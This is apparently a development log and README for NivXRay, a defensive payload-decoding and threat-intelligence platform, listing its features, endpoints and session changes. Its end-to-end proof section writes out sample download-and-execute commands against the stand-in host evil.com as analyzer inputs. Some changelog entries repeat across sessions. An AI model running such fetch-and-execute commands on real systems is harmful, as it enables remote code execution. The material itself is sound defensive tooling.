# NivXRay — Decoder & Threat Analysis Platform

## Problem Statement
Build a CyberChef-style tool called **NivXRay** ("like Payload Lab / CyberLab") with:
- 40+ deterministic decoders that work perfectly **without AI**
- AI-powered analysis (Auto Decode, Auto Investigate, Troubleshoot, Describe) via Claude Sonnet 4.5
- OSINT enrichment of extracted IOCs (IP, domain, URL, hash)
- Threat Intelligence / IOC Database with bulk feed sync
- Admin panel to manage OSINT + threat-intel API keys
- Rebranded design (dark oxidized-copper aesthetic, distinct from reference NivX Forge screenshots)

## Architecture
- **Backend**: FastAPI + MongoDB (motor async driver) + emergentintegrations (Claude Sonnet 4.5)
- **Frontend**: React + React Router, custom brutalist-technical UI (JetBrains Mono + Chivo)
- **Auth**: JWT (7-day expiry), bcrypt-hashed passwords, admin seeded on startup
- **Deployment**: supervisor (backend:8001, frontend:3000)

## User Personas
1. **DFIR / SOC Analyst** — triage encoded payloads, extract IOCs, produce reports
2. **Threat Intel Researcher** — sync feeds, cross-reference IOCs, analyze hits
3. **Admin** — manage API keys, users, feed sync

## Core Features (Implemented)
### Workspace (`/`)
- 3-column layout: Operations (left) · Input+Recipe+Output (center) · Threat Analysis (right)
- **45 operations** across Compression / Cryptography / Deobfuscation / Extractors / Formatting / Hashing
- Load-example presets (PowerShell -EncodedCommand, Ransomware Note, Defanged IOCs, Nested Base64→gzip, URL-encoded XSS)
- Toolbar: **Auto Investigate**, **AI Decode**, **Smart Decode** (deterministic), **Run Recipe**, **Troubleshoot**, **Share**, **Report**, **Upload**
- Recipe pipeline builder (reorderable, per-step args)
- Detected payload-type banner
- Analyze + OSINT + AI Describe on Output panel

### Threat Analysis Right Panel (7 tabs)
- MITRE ATT&CK (heuristic mapper — 15 techniques)
- YARA-lite rules (14 built-in rules with severity)
- IOCs (URLs, IPs, domains, emails, MD5/SHA1/SHA256, BTC)
- **TI-HITS** — cross-reference against local Threat-Intel DB
- OSINT (geo, rDNS, VirusTotal, AbuseIPDB, Shodan, GreyNoise, OTX, IPinfo, HybridAnalysis, URLScan)
- AI (verdict + narrative describe: summary, behavior, IOC narrative, attribution hints, actions)
- Chain (decode chain visualization)

### Threat Intelligence (`/threat-intel`)
- Sync 9 curated feeds (bulk): AlienVault OTX, AbuseIPDB, Malwarebytes Labs, Talos, ThreatFox, MalwareBazaar, VirusTotal Enterprise, URLhaus, CINS Army
- 2 lookup-only sources: URLScan.io, Shodan
- Per-source sync status, last-sync timestamps, new/updated counts, total stored
- **Sync all sources** button (admin only)
- **IOC browser** with search + kind/source/severity filters
- Live stats badge (critical / high / medium / low counts by kind)

### Admin (`/admin`)
- Stats cards (Operations, Users, Shared Recipes, OSINT Active, Total IOCs)
- OSINT integrations table (10 services): configure keys, mask on read, test button, remove button
- Users table

### Backend Endpoints (all `/api` prefixed)
- Auth: `/auth/login`, `/auth/me`
- Ops: `/operations`, `/examples`, `/recipe/run`, `/upload`
- Decode: `/decode/smart` (deterministic), `/ai/auto-decode`, `/ai/auto-investigate`, `/ai/troubleshoot`
- Analyze: `/analyze` (returns iocs, mitre, yara, risk, osint, ti_hits, ai_verdict, description)
- Share/Report: `/share`, `/share/{token}`, `/report`
- Threat Intel: `/threat-intel/sources`, `/threat-intel/stats`, `/threat-intel/sync/{id}`, `/threat-intel/sync-all`, `/threat-intel/iocs`, `/threat-intel/lookup/{value}`
- Admin: `/admin/osint/services`, `/admin/osint/settings`, `/admin/osint/test/{id}`, `/admin/users`, `/admin/stats`

## Design System
- Palette: `#101112` bg, `#18191b` surface, `#4AA890` oxidized copper accent, `#E27E5D` phosphor rust warn, `#D96C6C` high, `#C0CA33` low
- Fonts: **Chivo** (display) + **JetBrains Mono** (body/code)
- Brutalist: 1px sharp borders, no radius, layered inset backgrounds, subtle noise overlay

## Session Log
- **2026-01 · Session 1**: MVP complete — decoders, AI, OSINT, admin, threat-intel, rebrand to NIVXRAY.

## Backlog / Future Work
- P1: Real-time WebSocket streaming for LLM `describe` output
- P1: More YARA/MITRE rules
- P2: User management (invite / password reset / role editing) in Admin
- P2: Scheduled auto-sync of threat-intel feeds (cron)
- P2: Export IOCs (STIX 2.1 / MISP / CSV)
- P2: Threat-intel graph visualization (react-force-graph-2d)
- P3: Multi-tenant workspaces

## Session 2 (2026-01) — Deep Analytics
- Added **LOLBAS matcher** — 40 curated LOLBAS entries (certutil, mshta, rundll32, powershell, cmd, etc.) with argv-context detection + MITRE tagging + doc links
- Added **AI-driven MITRE mapping** with evidence citation, merged with heuristic hits (source badge shown)
- Added **Malware family attribution** (name + confidence + rationale) surfaced prominently in AI tab
- Added **Behavior Flow Graph** — AI-produced node/edge graph (start | filesystem | network | crypto | execution | persistence | discovery | c2 | impact | end), rendered on a canvas-based `FlowGraph` component
- Added **Universal file upload** — accepts ANY file format (PE, ELF, PDF, ZIP, Office, images, scripts). Returns MD5/SHA1/SHA256, magic-byte file-type detection, hex-dump preview, extracted strings ≥4 chars
- Added **Multi-format report export**: TXT · HTML · CSV · DOCX · PDF (native styling). All 5 verified downloadable end-to-end via `/api/report/{fmt}`.
- New backend modules: `lolbas.py`, updated `smart_decoder.py` (embedded-base64 blob extraction), extended `server.py` report renderers (`_render_text_report`, `_render_html_report`, `_render_csv_report`, `_render_docx_report`, `_render_pdf_from_html`)
- Frontend: new `FlowGraph.jsx`, `ReportMenu.jsx`, new tabs in `ThreatAnalysis.jsx` (LOLBAS, FLOW)
- Dependencies added: `python-docx==1.1.2`, `xhtml2pdf==0.2.16` (with `reportlab`), `react-force-graph-2d`

## Session 3 (2026-02) — Multi-line PS/Base64 Decoder Fix
- **Fixed** `powershell-encoded` operation in `/app/backend/operations.py`: now joins all input lines into a single string, strips all newlines/whitespace and non-base64 chars from the payload, auto-pads, and always decodes as **UTF-16LE** (PowerShell standard) with `errors="ignore"`.
- **Fixed** `base64-decode` operation: now auto-pads missing `=` characters and reliably handles multi-line/whitespace-broken base64 pastes.
- **Fixed** `_PS_ENCODED_RE` in `/app/backend/smart_decoder.py` to accept whitespace inside the captured base64 group `[A-Za-z0-9+/=\s]{16,}` — multi-line PS-encoded payloads are now detected by Smart Decode.
- **Fixed** smart_decoder's PS-encoded branch to strip whitespace and force UTF-16LE decoding.
- Regression tested via testing agent: **46/46 backend pytest tests pass** (27 new multi-line coverage tests added under `/app/backend/tests/test_multiline_decode.py`).
- Test-side fix: stale credential typo (`nivxary` → `nivxray`) in `test_nivxary.py` corrected.

## Session 4 (2026-02) — Streaming, LOLBAS Auto-Sync, Attack Graph Filter, Final Summary
- **P1 · Async job pipeline for AI-heavy runs** — new `/api/analyze/async` + `/api/analyze/status/{job_id}` pair replaces the SSE approach for Auto-Investigate (K8s ingress kills SSE at ~60s regardless of heartbeats). Background asyncio task fills progress from 5% → 25% → 45% → 90% → 100%; jobs stored in-memory with 15-min TTL. Frontend polls every 3s and cleanly bypasses the proxy timeout. `/api/analyze/stream` SSE endpoint kept for future short-run streaming use.
- **P2 · LOLBAS auto-sync** — `/app/backend/lolbas.py` rewritten to fetch the full **239-entry** official catalog from `https://lolbas-project.github.io/api/lolbas.json`, cache in MongoDB `lolbas_cache`, merge with **40 curated argv-pattern rules** (defaults win on binary-name conflict). Auto-refreshes on backend startup if last sync is >7 days old. Failure preserves last-good cache. New admin endpoints: `GET /admin/lolbas/status`, `POST /admin/lolbas/sync`. Admin UI card added.
- **P3 · Click-to-filter on Tactical Attack Graph** — clicking a lane header or node in the graph sets a tactic filter that dims other lanes/nodes/edges AND filters MITRE + LOLBAS tabs in the Threat Analysis panel. Filter badge in the AG card head and a banner in the Threat Analysis panel, both with a **CLEAR** button.
- **Final Summary card** below the Attack Graph — consolidates malware family, executive summary, attack chain, observed behavior, IOC narrative, attribution hints, and recommended actions. **COPY** + **DOWNLOAD TXT** buttons.
- **Attack Graph snapshots** — PNG (2x hi-DPI, canvas-rendered) and SVG native downloads directly from the graph toolbar.
- Regression: **57/57 backend pytest tests pass** (11 new coverage tests in `test_new_features.py`). Auto-Investigate end-to-end verified in ~56-78s with all cards, filters, and downloads working.

## Session 5 (2026-02) — Weaponized Decoding + Training Studio
- **+42 operations** — total now **87**. Adds AES-CBC/GCM/ECB, DES/3DES-CBC, RC4, ChaCha20, HMAC-SHA1/256/512/MD5, PBKDF2-SHA256, SHA3-256/512, MD4, RIPEMD-160, bzip2/LZMA/LZ4 decompress, UTF-16BE/UTF-32/CP1252/ASCII85/Base85 codecs, JWT decode/verify, ASN.1/DER parse, MessagePack, JSON diff, PE-header parse, PE-strings extract, ELF-header parse, PDF header sniff, file-magic byte identifier, JS beautify, JS `\x`-escape decoder, printable-ratio / Shannon-entropy / byte-frequency utilities.
- **Magic Recursive Auto-Decoder** (`POST /api/decode/magic`) — CyberChef "Magic" parity.
- **Automated payload sanitizer** — the "isolate the payload string first" thumb rule. Strips PowerShell/Bash wrappers before decode.
- **Known-signature auto-chain** — H4sIA→gzip, JAB/SQBFAF→UTF-16LE PowerShell, TVq→PE, etc.
- **Recipe URL sharing** — `#recipe=<base64>` restores input + steps.
- **Model Studio 5th kind → `playbook`** — free-form analyst training text auto-appended to every AI investigation.
- **NivX Cognis** — flagship in-house AI persona, auto-selected in the Workspace picker.

## Session 6 (2026-02) — Malware Sample Library + Continuous Benchmark
- **Sample Library** (`/app/backend/sample_library.py`) — MongoDB-backed collection storing real-world encoded payloads + expected decoded outputs + categories + MITRE + IOC labels.
- **12 categories** with per-category coverage tracking: PowerShell, CMD, Bash, Python, JavaScript, .NET, LOLBAS, Malware Family, Compression, Crypto, Multi-stage, Living-off-the-Land.
- **15 built-in seed samples** covering canonical PS -EncodedCommand, multi-line base64, Python b64decode wrapper, nested base64, hex, XOR shellcode declaration, gzip (H4sIA), zlib, LZMA, JWT, JS atob, bash base64 -d, CMD caret obfuscation, LOLBAS certutil, and a redacted Lumma stealer stub.
- **Endpoints**: `/api/admin/samples` (list · CRUD · bulk import · dashboard), `/api/admin/samples/{id}/benchmark`, `/api/admin/samples/benchmark/all`.
- **Benchmark logic** — runs both **Smart Decoder** and **Magic Decoder** against every sample, scores pass/fail by expected-output substring match, produces per-category coverage report.
- **Nightly benchmark cron** — asyncio background task runs `benchmark_all` every 24h and persists results in `benchmark_runs` collection for historical tracking.
- **Frontend** (`/app/frontend/src/pages/SampleLibraryPage.jsx`) — full CRUD UI, color-coded coverage dashboard (green ≥95% / orange ≥70% / red <70%), inline expand for raw/expected/notes, per-row + all-samples BENCH buttons, JSON bulk import.
- **Header + Admin quick-link nav** to `/admin/samples`.
- Initial benchmark on seeded samples: **10/15 pass (66.7%)** — exposes real decoder gaps for follow-up work (LZMA / Zlib / H4sIA-gzip auto-chain / JWT / JS atob).
- Regression: **57/57 backend pytest pass**.

## Backlog (P1/P2 remaining)
- P1: Client-side WASM ops for real-time preview.
- P1: Live diff-highlight between INPUT & OUTPUT columns.
- P2: PE / ELF loader (parse imports, section table) — extends shellcode_analyzer.
- P2: Modularize `/app/backend/server.py` into routers.
- P2: STIX 2.1 export + community share page.

## Session 8 (2026-02) — Intelligent Command-Line Analysis Engine (ICAE)

- **New module** `/app/backend/command_analyzer.py` — execution-aware command-line semantic engine.
  - Interpreter registry: `powershell`, `cmd`, `bash`, `python`, `javascript` (node/deno), `mshta`, `rundll32`, `regsvr32`, `certutil`, `wscript`/`cscript`, `msiexec`, `curl`/`wget`, `bitsadmin`. Each profile encodes `payload_flags` (values are inline payloads to decode) and `file_operand_flags` (values are FILES — never decode).
  - Shell-aware `split_pipeline()` (respects quoted strings, handles `|`, `&&`, `||`, `;`, `>` connectors) + `tokenize()` with a POSIX/Windows shlex fallback.
  - `_find_payload_spans()` scans tokens for encoded regions with per-span confidence: PS `-Enc`/`-EncodedCommand` value → 0.98, `[Convert]::FromBase64String("…")` → 0.95, `atob("…")` / `base64.b64decode("…")` → 0.95, unicode-escape → 0.85, chr()+chr() concat → 0.80, URL-encoded → 0.75, standalone long base64 → 0.72, long hex → 0.60.
  - **Confidence gate**: auto-decode only ≥0.80. Multiple candidates tied within 0.05 → `needs_choice:true` + `choice_reason`. Frontend prompts the analyst to pick.
  - **Never decode file operands**: `certutil -decode input.b64 output.exe` correctly returns `identified_payloads: []` + behavior `file-decode`.
  - **Execution-flow classifier** `classify_behaviors()` — tags: `network-fetch`, `in-memory-execute`, `download-and-execute` (pipeline: downloader → interpreter), `persistence`, `file-decode`, `stealth-flags`.
  - `_decode_span()` runs the span through smart_decode + magic_decode, filters out empty-chain candidates, picks the highest-scoring non-trivial chain, and preserves the shellcode-stop flag.
  - Unified `extract_iocs()` (URLs, IPs, domains, file paths, reg-keys, MD5/SHA1/SHA256) and `map_mitre()` with deduped rules (T1027, T1059.001, T1105, T1140, T1218.005/010/011, T1071.001, T1053.005, T1197, …).
  - `reconstruct_inline()` renders the original command with each decoded span annotated as `«decoded: …»` — preserves syntax so analysts can visually diff obfuscated vs decoded.
  - `summarize()` produces the analyst behavior brief.
- **New endpoint** `POST /api/analyze/command` — payload `{input, force_decode_span?}`. Returns `{original_command, parsed_structure, identified_payloads, needs_choice, choice_reason, decode_chains, final_decoded_inline, iocs, lolbins, mitre, behaviors, behavior_summary, raw_tokens}`.
- **New page** `/analyze` — "COMMAND ANALYZER" nav tab. Renders parsed structure, identified payloads with confidence bars + reason, decode chains with inline shellcode view, IOCs / LOLBins / MITRE panels, behavior summary. `needs_choice` surfaces an in-app picker for tied payloads.
- **New features in ops_extended**: `env-expand` (%TEMP% / $env:APPDATA / ${HOME} / ~/ → canonical placeholder paths) + `xor-brute` (Kasiski + English-scoring, up to 32-byte repeating keys, Occam-shave prefers shorter keys). Integrated into smart_decoder (post-decode env-expand) and magic_decoder (xor-brute candidate for high-entropy buffers).
- **ShellcodeView wired into `/decode/magic` modal**: each candidate flagged `is_shellcode:true` shows an inline `🔬 ANALYZE BINARY` toggle that expands Capstone disassembly + IOC panel inside the modal.
- Regression: **121/121** pytest pass (adds 22 shellcode + 28 command-analyzer). Malware Sample Library benchmark still **17/17 = 100.0%**.

### End-to-end proof (all four scenarios from the design brief)
1. `powershell.exe -NoP -W Hidden -Enc SQBF…` → auto-decodes to `IEX (New-Object Net.WebClient).DownloadString("http://evil.com/x.ps1")`, MITRE T1059.001 + T1105 + T1071.001.
2. `powershell -c "[Convert]::FromBase64String('aGVsbG8gd29ybGQ=')"` → `needs_choice` (0.98 vs 0.95). Force-decode returns `hello world`.
3. `certutil -decode input.b64 output.exe` → **zero** inline decodes attempted. Flagged as `file-decode` LOLBin, MITRE T1140.
4. `curl http://evil.com/payload.ps1 | powershell` → NO base64 hallucination. Behaviors `network-fetch` + `download-and-execute`, MITRE T1071.001, URL extracted.

## Session 7 (2026-02) — Benchmark 100% + Playbook Feedback Loop + Recursive Decode-and-Route

### Sub-session A · Benchmark 100% (Compression + JWT + JS atob patch)
- **Compression samples fixed** — regenerated valid base64+gzip / base64+zlib / base64+lzma raw_input blobs and added a new `Bzip2-compressed base64` seed (17 built-in samples).
- **Sanitizer** — `sanitize_encapsulated_payload` short-circuits JWT-shaped inputs so `jwt-decode` sees the whole token.
- **Smart decoder** — after sanitizer isolation, eagerly base64-decodes + applies compression-magic fast-path (gzip/zlib/lzma/bzip2 via shared `_bin_magic_op`).
- **Signature registry** — added zlib (`^e[AFJN]`), LZMA (`^/Td6WFo`), bzip2 (`^QlpoO`) base64-prefix signatures.
- **Seed-refresh** — `seed_builtins` updates protected built-ins in place when data diverges. Benchmark: **17/17 = 100.0%**.

### Sub-session B · Playbook feedback loop (👍/👎 with audit trail)
- `record_playbook_vote()` in `models_studio.py` — toggle-aware, reverses previous vote counters before applying new one. Full audit trail appended to `playbook_votes.history`.
- New collection `playbook_votes` with unique index `(job_id, analyst_email)`.
- Endpoints: `POST/GET /api/analyze/{job_id}/feedback`, `GET /api/admin/playbooks/{id}/votes`.
- Auto-boost: `get_active_playbooks` sorts by `feedback_weight = pos − neg` DESC, falls back to `usage_count`.
- Frontend: `PlaybookFeedback` widget on Final Summary card + Threat Analysis header, `PlaybookScorecard` badge on Model Studio playbook cards.
- **NOTE**: End-to-end backend testing agent timed out during a long AI-dependent flow; feedback endpoints smoke-tested manually (up→down→none, counters + audit correct). Fast unit tests in `tests/test_playbook_feedback.py` (needs `-n 0` to skip serialised AI polls).

### Sub-session C · Recursive Decode-and-Route pipeline
- **XOR key parser** in `payload_sanitizer.py` — `find_xor_key()` regex-extracts `-bxor 35`, `-bxor 0x2A`, `-bxor 'A'`, `^ 0x35`, `xor eax, 0x…`, `xor byte ptr [rax], 0x…` patterns.
- **Multi-stage span extraction** — `find_all_base64_spans()` re-scans the current text (after each decode) for a *second* `FromBase64String("…")` and isolates it, avoiding infinite base64→base64 loops via the `looks_wrapped` guard.
- **Magic decoder** — now threads a `ctx` (parsed XOR key etc.) through the recursive walk. When it sees a clean-base64 buffer AND a parent layer supplied a key, it plans the deterministic `base64-decode → xor(key)` chain. Chain-completion bonus surfaces fully-decoded chains above intermediate stopping points.
- **Shellcode stop-condition** — new `shellcode_analyzer.py` module: `shannon_entropy`, `is_shellcode` (entropy + prologue heuristics for MSFVenom / Cobalt-Strike / MZ / ELF / Mach-O / ARM64), `detect_arch` (auto x86 / x86_64 / ARM / Thumb / ARM64 via Capstone coverage scoring), `disassemble` (Capstone listing with addr / hex / mnemonic / operands), `extract_iocs` (URLs, IPs, domains, MD5/SHA1/SHA256, reg-keys, mutexes, API imports).
- **New API**: `POST /api/analyze/shellcode` — accepts hex / base64 / utf-8; returns arch + entropy + disassembly + IOCs. Manual arch override supported.
- **New frontend**: `ShellcodeView.jsx` auto-renders below the workspace output when the magic decoder flags `is_shellcode: true`. Arch selector (AUTO / x86_64 / x86 / ARM64 / ARM / THUMB), hex preview, live disassembly table, collapsible IOC panel.
- **Dependency**: added `capstone==5.0.9`. Regression: **71/71 pytest pass** (excluding the AI-dependent feedback loop suite) + **22/22 new pipeline tests** in `tests/test_shellcode_pipeline.py`.
- **End-to-end proof**: Cobalt-Strike-style payload `base64(gzip(script containing base64('xor 35')))` decodes to `echo COBALT_STAGER_UNMASKED` in the #1 chain (score 0.65, all 5 ops chained deterministically). MSF x64 stager `fc4883e4f0e8…` auto-detects as x86_64, correctly disassembles to `cld; and rsp, -16; call …`.
- **+42 operations** — total now **87**. Adds AES-CBC/GCM/ECB, DES/3DES-CBC, RC4, ChaCha20, HMAC-SHA1/256/512/MD5, PBKDF2-SHA256, SHA3-256/512, MD4, RIPEMD-160, bzip2/LZMA/LZ4 decompress, UTF-16BE/UTF-32/CP1252/ASCII85/Base85 codecs, JWT decode/verify, ASN.1/DER parse, MessagePack, JSON diff, PE-header parse, PE-strings extract, ELF-header parse, PDF header sniff, file-magic byte identifier, JS beautify, JS `\x`-escape decoder, printable-ratio / Shannon-entropy / byte-frequency utilities. (`/app/backend/ops_extended.py`)
- **Magic Recursive Auto-Decoder** (`POST /api/decode/magic`) — CyberChef "Magic" parity. Tries every plausible op, scores each output (printable + English + entropy + structure signatures), and returns the top-N chains. UI: MAGIC button + modal with per-candidate scores/reasons + APPLY CHAIN.
- **Automated payload sanitizer** (`/app/backend/payload_sanitizer.py`) — the "isolate the payload string first" thumb rule. Strips PowerShell/Bash wrappers (`[System.Convert]::FromBase64String`, `[Byte[]]$var_code`, `-EncodedCommand`, `echo …| base64 -d`, brackets, `$vars`) and extracts the longest base64/hex payload from inside quotes. Wired into `base64-decode`, `powershell-encoded`, `smart_decode`, `magic_decode`.
- **Known-signature auto-chain** (`/app/backend/signatures.py`) — recognized base64 prefixes: H4sIA→gzip, JAB/SQBFAF→UTF-16LE PowerShell, TVq→PE, UEsD→ZIP, JVBER→PDF, f0VMRg→ELF, plus XOR-loop key sniffer. Sourced from Sophos Cobalt-Strike teardowns.
- **Recipe URL sharing** — `#recipe=<base64>` URL loads input + recipe on next visit. `COPY LINK` button on the toolbar.
- **Model Studio 5th kind → `playbook`** — free-form analyst training text auto-appended to every AI investigation. Seeded with a **Malicious PowerShell Decoder Playbook** (Sophos-style layered stager rules + MITRE mappings) and a **LOLBAS Triage Guidance** playbook.
- **NivX Cognis** — the flagship in-house AI persona, auto-selected in the Workspace picker. Trained on the Sophos layered-stager decoder + MITRE + LOLBAS pipeline. Uses Claude Sonnet 4.5 by default (via Emergent Universal LLM Key).
- Regression: **57/57 backend pytest pass**.

